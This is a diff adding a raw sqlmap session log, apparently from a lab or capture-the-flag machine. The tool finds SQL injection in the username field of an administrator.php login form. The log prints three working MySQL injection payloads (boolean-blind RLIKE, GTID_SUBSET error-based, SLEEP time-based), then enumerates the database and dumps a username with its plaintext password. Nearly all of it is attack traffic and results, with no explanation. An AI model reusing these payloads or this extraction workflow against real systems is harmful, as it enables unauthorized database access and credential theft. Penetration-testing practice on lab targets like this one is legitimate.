@@ -1,0 +1,111 @@
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.5.4.5#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:56:43 /2021-04-14/
+
+[17:56:43] [INFO] testing connection to the target URL
+[17:56:43] [INFO] searching for forms
+[#1] form:
+POST http://10.10.63.104/administrator.php
+POST data: username=&password=
+do you want to test this form? [Y/n/q] 
+> Edit POST data [default: username=&password=] (Warning: blank fields detected): 
+do you want to fill blank fields with random values? [Y/n] [17:57:05] [INFO] using '/home/gabriel/.sqlmap/output/results-04142021_0557pm.csv' as the CSV results file in multiple targets mode
+[17:57:06] [INFO] testing if the target URL content is stable
+[17:57:06] [INFO] target URL content is stable
+[17:57:06] [INFO] testing if POST parameter 'username' is dynamic
+[17:57:06] [WARNING] POST parameter 'username' does not appear to be dynamic
+[17:57:06] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
+[17:57:06] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+[17:57:06] [INFO] testing for SQL injection on POST parameter 'username'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [17:57:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:57:26] [WARNING] reflective value(s) found and filtering out
+[17:57:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[17:57:26] [INFO] testing 'Generic inline queries'
+[17:57:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[17:57:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[17:57:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[17:57:33] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[17:57:33] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="not")
+[17:57:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[17:57:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[17:57:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[17:57:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[17:57:33] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[17:57:33] [INFO] POST parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[17:57:33] [INFO] testing 'MySQL inline queries'
+[17:57:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[17:57:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[17:57:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[17:57:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[17:57:33] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[17:57:33] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[17:57:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[17:57:44] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[17:57:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[17:57:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[17:57:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[17:57:44] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[17:57:44] [INFO] target URL appears to have 2 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] [17:58:01] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[17:58:02] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[17:58:03] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[17:58:04] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[17:58:05] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[17:58:06] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[17:58:07] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[17:58:08] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[17:58:09] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[17:58:10] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 388 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=aQcT' RLIKE (SELECT (CASE WHEN (4145=4145) THEN 0x61516354 ELSE 0x28 END))-- QVfg&password=
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: username=aQcT' AND GTID_SUBSET(CONCAT(0x71716a7871,(SELECT (ELT(5050=5050,1))),0x716b717a71),5050)-- pBNc&password=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=aQcT' AND (SELECT 4440 FROM (SELECT(SLEEP(5)))CtAz)-- DlVE&password=
+---
+do you want to exploit this SQL injection? [Y/n] [17:58:50] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[17:58:50] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[17:58:50] [INFO] fetching current database
+[17:58:51] [INFO] retrieved: 'users'
+[17:58:51] [INFO] fetching tables for database: 'users'
+[17:58:51] [INFO] retrieved: 'users'
+[17:58:51] [INFO] fetching columns for table 'users' in database 'users'
+[17:58:51] [INFO] retrieved: 'username'
+[17:58:51] [INFO] retrieved: 'varchar(100)'
+[17:58:51] [INFO] retrieved: 'password'
+[17:58:51] [INFO] retrieved: 'varchar(100)'
+[17:58:51] [INFO] fetching entries for table 'users' in database 'users'
+[17:58:51] [INFO] retrieved: 'secretpass'
+[17:58:51] [INFO] retrieved: 'pingudad'
+Database: users
+Table: users
+[1 entry]
++----------+------------+
+| username | password   |
++----------+------------+
+| pingudad | secretpass |
++----------+------------+
+
+[17:58:51] [INFO] table 'users.users' dumped to CSV file '/home/gabriel/.sqlmap/output/10.10.63.104/dump/users/users.csv'
+[17:58:51] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/gabriel/.sqlmap/output/results-04142021_0557pm.csv'
+
+[*] ending @ 17:58:51 /2021-04-14/
+
